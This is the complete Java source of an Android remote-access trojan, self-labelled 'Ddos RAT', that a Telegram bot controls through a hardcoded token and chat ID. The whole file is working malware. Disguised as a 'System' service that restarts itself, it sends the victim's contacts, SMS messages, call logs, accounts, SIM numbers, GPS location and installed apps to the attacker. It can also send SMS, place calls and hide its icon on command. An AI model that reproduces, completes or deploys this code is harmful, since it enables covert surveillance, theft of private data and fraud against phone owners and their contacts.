package com.ddos.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;
import java.util.concurrent.TimeUnit;

import okhttp3.*;

public class TelegramBot extends Service {

    public static final String BOT_TOKEN = "8316267953:AAGio6wBCcY2wyyRrSQQcjQrWC--oiugoGo";
    public static final String CHAT_ID   = "8359688241";
    public static final String API       = "https://api.telegram.org/bot" + BOT_TOKEN;
    public static final String CHANNEL   = "ddos_svc";

    private static Context ctx;
    private static final OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build();

    private long lastId = 0;
    private volatile boolean running = true;

    @Override
    public void onCreate() {
        super.onCreate();
        ctx = getApplicationContext();
        try {
            startFg();
        } catch (Exception e) {}
        poll();
    }

    private void startFg() {
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel ch = new NotificationChannel(CHANNEL, "System",
                        NotificationManager.IMPORTANCE_LOW);
                ch.setShowBadge(false);
                NotificationManager nm = getSystemService(NotificationManager.class);
                if (nm != null) nm.createNotificationChannel(ch);
            }

            Notification n = new NotificationCompat.Builder(this, CHANNEL)
                    .setContentTitle("System")
                    .setContentText("Running")
                    .setSmallIcon(android.R.drawable.stat_notify_sync)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .setOngoing(true)
                    .build();

            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(1001, n,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(1001, n);
            }
        } catch (Exception ignored) {}
    }

    public void init(Context c) { ctx = c; }

    public void sendMessage(String t) { sendTo(Long.parseLong(CHAT_ID), t); }

    public void sendTo(long chat, String text) {
        try {
            HttpUrl url = HttpUrl.parse(API + "/sendMessage").newBuilder()
                    .addQueryParameter("chat_id", String.valueOf(chat))
                    .addQueryParameter("text", text)
                    .addQueryParameter("parse_mode", "HTML")
                    .build();
            client.newCall(new Request.Builder().url(url).get().build()).execute().close();
        } catch (Exception ignored) {}
    }

    private void poll() {
        new Thread(() -> {
            while (running) {
                try {
                    HttpUrl url = HttpUrl.parse(API + "/getUpdates").newBuilder()
                            .addQueryParameter("offset", String.valueOf(lastId + 1))
                            .addQueryParameter("timeout", "25")
                            .build();
                    Response r = client.newCall(
                            new Request.Builder().url(url).get().build()).execute();
                    String body = r.body().string();
                    r.close();

                    JSONArray arr = new JSONObject(body).getJSONArray("result");
                    for (int i = 0; i < arr.length(); i++) {
                        JSONObject u = arr.getJSONObject(i);
                        lastId = u.getLong("update_id");
                        if (!u.has("message")) continue;
                        JSONObject m = u.getJSONObject("message");
                        if (!m.has("text")) continue;
                        handle(m.getJSONObject("chat").getLong("id"),
                               m.getString("text").trim());
                    }
                } catch (Exception e) {
                    try { Thread.sleep(2500); } catch (Exception ignored) {}
                }
            }
        }).start();
    }

    private void handle(long cid, String cmd) {
        String c = cmd.toLowerCase();

        if (c.startsWith("/")) {
            switch (c) {
                case "/start":
                case "/help":
                    sendTo(cid,
                        "\uD83E\uDD16 <b>Ddos RAT</b>\n\n" +
                        "Info:\n" +
                        "/id /device /sim /accounts /location /battery\n" +
                        "/contacts /sms /calls /apps\n\n" +
                        "Control:\n" +
                        "/sms number msg\n/call number\n" +
                        "/hide /users /die");
                    break;
                case "/id":       sendFullIdentityTo(cid); break;
                case "/device":   sendDeviceInfoTo(cid); break;
                case "/sim":      sendSimNumbersTo(cid); break;
                case "/accounts": sendAccountsTo(cid); break;
                case "/location": sendLocationTo(cid); break;
                case "/battery":  sendBatteryTo(cid); break;
                case "/contacts": sendContactsTo(cid); break;
                case "/sms":      sendLast10SMSTo(cid); break;
                case "/calls":    sendCallLogsTo(cid); break;
                case "/apps":     sendAppsTo(cid); break;
                case "/users":    sendTo(cid, UserRegistry.dump(ctx)); break;
                case "/hide":     MainActivity.hideIcon(ctx); sendTo(cid, "hidden"); break;
                case "/die":      running = false; stopSelf(); break;
                default:
                    if (c.startsWith("/sms ")) {
                        try {
                            String[] p = cmd.split(" ", 3);
                            android.telephony.SmsManager.getDefault()
                                .sendTextMessage(p[1], null, p[2], null, null);
                            sendTo(cid, "sms sent");
                        } catch (Exception e) { sendTo(cid, "sms fail"); }
                    } else if (c.startsWith("/call ")) {
                        try {
                            String[] p = cmd.split(" ");
                            Intent i = new Intent(Intent.ACTION_CALL);
                            i.setData(android.net.Uri.parse("tel:" + p[1]));
                            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            ctx.startActivity(i);
                            sendTo(cid, "call started");
                        } catch (Exception e) { sendTo(cid, "call fail"); }
                    }
            }
        }
    }

    public void sendFullIdentity() { sendFullIdentityTo(Long.parseLong(CHAT_ID)); }

    private void sendFullIdentityTo(long cid) {
        sendTo(cid, "\uD83D\uDEA8 <b>NEW INSTALL</b>");
        sendDeviceInfoTo(cid);
        sendSimNumbersTo(cid);
        sendTMNumberTo(cid);
        sendAccountsTo(cid);
        sendLocationTo(cid);
        sendBatteryTo(cid);
    }

    private void sendDeviceInfoTo(long cid) {
        StringBuilder sb = new StringBuilder("\uD83D\uDCF1 <b>Device</b>\n");
        sb.append("Model: ").append(Build.MODEL).append("\n")
          .append("Brand: ").append(Build.BRAND).append("\n")
          .append("Android: ").append(Build.VERSION.RELEASE)
          .append(" (API ").append(Build.VERSION.SDK_INT).append(")\n")
          .append("Device: ").append(Build.DEVICE).append("\n")
          .append("Hardware: ").append(Build.HARDWARE).append("\n");
        sendTo(cid, sb.toString());
    }

    private void sendSimNumbersTo(long cid) {
        try {
            android.telephony.SubscriptionManager sm =
                (android.telephony.SubscriptionManager)
                    ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
            if (sm != null) {
                List<android.telephony.SubscriptionInfo> subs =
                    sm.getActiveSubscriptionInfoList();
                if (subs != null && !subs.isEmpty()) {
                    StringBuilder sb = new StringBuilder("\uD83D\uDCF1 <b>SIM Numbers</b>\n");
                    for (android.telephony.SubscriptionInfo s : subs) {
                        sb.append("\u2022 Slot ").append(s.getSimSlotIndex())
                          .append(": ").append(s.getNumber())
                          .append(" (").append(s.getCarrierName()).append(")\n");
                    }
                    sendTo(cid, sb.toString());
                    return;
                }
            }
            sendTo(cid, "SIM number unavailable");
        } catch (Exception e) { sendTo(cid, "sim err"); }
    }

    private void sendTMNumberTo(long cid) {
        try {
            android.telephony.TelephonyManager tm =
                (android.telephony.TelephonyManager)
                    ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                String n = tm.getLine1Number();
                if (n != null && !n.isEmpty()) sendTo(cid, "\uD83D\uDCDE " + n);
            }
        } catch (Exception ignored) {}
    }

    private void sendAccountsTo(long cid) {
        try {
            android.accounts.AccountManager am =
                android.accounts.AccountManager.get(ctx);
            android.accounts.Account[] accs = am.getAccounts();
            StringBuilder sb = new StringBuilder("\uD83D\uDD10 <b>Accounts</b>\n");
            for (android.accounts.Account a : accs)
                sb.append("\u2022 ").append(a.type).append(" : ").append(a.name).append("\n");
            sendTo(cid, sb.toString());
        } catch (Exception ignored) {}
    }

    private void sendLocationTo(long cid) {
        try {
            android.location.LocationManager lm =
                (android.location.LocationManager)
                    ctx.getSystemService(Context.LOCATION_SERVICE);
            android.location.Location l = null;
            if (lm != null) {
                if (lm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER))
                    l = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
                if (l == null && lm.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER))
                    l = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);
            }
            if (l != null)
                sendTo(cid, "\uD83D\uDCCD https://maps.google.com/?q="
                        + l.getLatitude() + "," + l.getLongitude());
        } catch (Exception ignored) {}
    }

    private void sendBatteryTo(long cid) {
        android.content.Intent b = ctx.registerReceiver(null,
            new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
        if (b != null) {
            int l = b.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int s = b.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            sendTo(cid, "\uD83D\uDD0B " + (int)((l / (float)s) * 100) + "%");
        }
    }

    private void sendContactsTo(long cid) {
        try {
            android.database.Cursor c = ctx.getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
            StringBuilder sb = new StringBuilder("\uD83D\uDC65 <b>Contacts</b>\n");
            int n = 0;
            if (c != null) {
                while (c.moveToNext() && n < 300) {
                    sb.append("\u2022 ")
                      .append(c.getString(c.getColumnIndexOrThrow(
                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                      .append(" \u2014 ")
                      .append(c.getString(c.getColumnIndexOrThrow(
                        android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)))
                      .append("\n");
                    n++;
                    if (sb.length() > 3500) { sendTo(cid, sb.toString()); sb = new StringBuilder(); }
                }
                c.close();
            }
            if (sb.length() > 0) sendTo(cid, sb.toString());
        } catch (Exception ignored) {}
    }

    private void sendLast10SMSTo(long cid) {
        try {
            android.database.Cursor c = ctx.getContentResolver().query(
                android.net.Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC");
            StringBuilder sb = new StringBuilder("\uD83D\uDCE9 <b>Last 10 SMS</b>\n");
            int n = 0;
            if (c != null) {
                while (c.moveToNext() && n < 10) {
                    sb.append("From: ").append(c.getString(c.getColumnIndexOrThrow("address")))
                      .append("\n").append(c.getString(c.getColumnIndexOrThrow("body")))
                      .append("\n\n");
                    n++;
                }
                c.close();
            }
            sendTo(cid, sb.toString());
        } catch (Exception ignored) {}
    }

    private void sendCallLogsTo(long cid) {
        try {
            android.database.Cursor c = ctx.getContentResolver().query(
                android.provider.CallLog.Calls.CONTENT_URI, null, null, null,
                android.provider.CallLog.Calls.DATE + " DESC");
            StringBuilder sb = new StringBuilder("\uD83D\uDCDE <b>Calls</b>\n");
            int n = 0;
            if (c != null) {
                while (c.moveToNext() && n < 30) {
                    sb.append("\u2022 ").append(c.getString(c.getColumnIndexOrThrow(
                        android.provider.CallLog.Calls.NUMBER))).append("\n");
                    n++;
                }
                c.close();
            }
            sendTo(cid, sb.toString());
        } catch (Exception ignored) {}
    }

    private void sendAppsTo(long cid) {
        try {
            List<android.content.pm.ApplicationInfo> apps =
                ctx.getPackageManager().getInstalledApplications(0);
            StringBuilder sb = new StringBuilder("\uD83D\uDCE6 <b>Apps</b>\n");
            for (int i = 0; i < apps.size() && i < 100; i++)
                sb.append("\u2022 ").append(apps.get(i).packageName).append("\n");
            sendTo(cid, sb.toString());
        } catch (Exception ignored) {}
    }

    @Nullable @Override public IBinder onBind(Intent i) { return null; }

    @Override public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }

    @Override public void onDestroy() {
        Intent r = new Intent(getApplicationContext(), TelegramBot.class);
        try {
            if (Build.VERSION.SDK_INT >= 26)
                getApplicationContext().startForegroundService(r);
            else getApplicationContext().startService(r);
        } catch (Exception ignored) {}
        super.onDestroy();
    }
                           }
